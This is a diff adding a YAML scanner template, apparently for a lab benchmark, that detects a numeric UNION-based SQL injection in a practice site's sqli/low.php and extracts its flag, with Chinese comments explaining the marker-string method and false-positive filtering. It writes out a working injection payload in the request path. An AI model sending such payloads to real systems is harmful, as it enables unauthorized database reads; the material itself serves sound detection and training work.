@@ -1,0 +1,62 @@
+id: vulnlab-sqli-low-union
+
+info:
+  name: VulnLab SQL 注入（low 档 · 数字型 UNION 回显）
+  severity: high
+  author: hediwen
+  tags: [sqli, vulnlab, benchmark]
+  description: |
+    VulnLab 靶场 sqli/low.php 存在数字型 SQL 注入，且查询结果直接回显在页面上。
+
+    检测思路：注入一个「只可能来自注入结果」的标记字符串。
+    如果标记出现在响应里，说明 UNION 查询确实被执行了 ——
+    对比「猜参数值」这种模糊判断，用回显标记是**确定性**证据，
+    只要标记出现就是注入成功，不会因为业务逻辑巧合而误判。
+
+    负向对照：引擎会额外请求同目录下的随机路径，
+    若随机路径也返回相同内容则判为误报（本靶场不会）。
+  reference:
+    - https://owasp.org/Top10/A03_2021-Injection/
+
+requests:
+  - method: GET
+    path:
+      # id=-1 让原查询返回空，页面上只剩注入结果，避免与真实数据混淆；
+      # 第二列填入标记串，它会渲染在原 username 列的位置。
+      - "{{BaseURL}}/sqli/low.php?id=-1%20UNION%20SELECT%201,'VULNLAB_POC_MARKER',3,4"
+
+    matchers-condition: and
+
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB_POC_MARKER"
+
+      # 反向匹配（negative: true）：响应中【不】包含这些内容时才算命中。
+      #
+      # 为什么需要这一条：数据库的报错信息会把出错的语句原文回显出来，
+      # 而 payload（含上面的标记串）正好在那段原文里 ——
+      # 于是「注入失败但报错回显」也会让标记串出现，造成误报。
+      #
+      # 这是注入检测里最典型的误报来源：
+      # 检测特征被检测行为本身「制造」了出来。
+      - type: word
+        part: body
+        words:
+          - "数据库错误"
+          - "SQLSTATE"
+          - "syntax error"
+        condition: or
+        negative: true
+
+    extractors:
+      # 顺带把通关凭证取出来 —— 证明注入不只是「有回显」，而是真的能读数据
+      - type: regex
+        part: body
+        name: secret
+        regex:
+          - "VULNLAB\\{[^}]+\\}"
